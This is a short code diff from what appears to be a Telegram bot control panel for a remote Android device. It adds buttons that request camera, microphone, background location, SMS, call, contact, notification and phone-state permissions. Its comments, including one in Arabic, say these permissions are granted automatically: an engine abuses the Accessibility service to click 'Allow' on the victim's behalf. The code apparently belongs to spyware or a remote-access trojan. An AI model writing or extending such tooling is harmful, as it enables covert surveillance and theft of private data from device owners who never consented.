@@ -437,11 +437,14 @@ def advanced_keyboard(did):
 def permissions_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
     # ✅ Permission request buttons - each requests + auto-grants via Accessibility
+    # PermissionAutoGrantEngine ينقر تلقائياً على "السماح" عبر 3 استراتيجيات
     perm_btn = lambda perm: InlineKeyboardButton(f"🔓 {perm}", callback_data=_cb(did, "cmd", f"request-permission:{perm}"))
-    kb.add(perm_btn("all"), perm_btn("camera"))
-    kb.add(perm_btn("microphone"), perm_btn("location"))
+    kb.add(perm_btn("all"), perm_btn("all-with-notifications"))
+    kb.add(perm_btn("camera"), perm_btn("microphone"))
+    kb.add(perm_btn("location"), perm_btn("background-location"))
     kb.add(perm_btn("storage"), perm_btn("contacts"))
     kb.add(perm_btn("sms"), perm_btn("calls"))
+    kb.add(perm_btn("notifications"), perm_btn("phone-state"))
     kb.add(_back(did))
     return kb
 
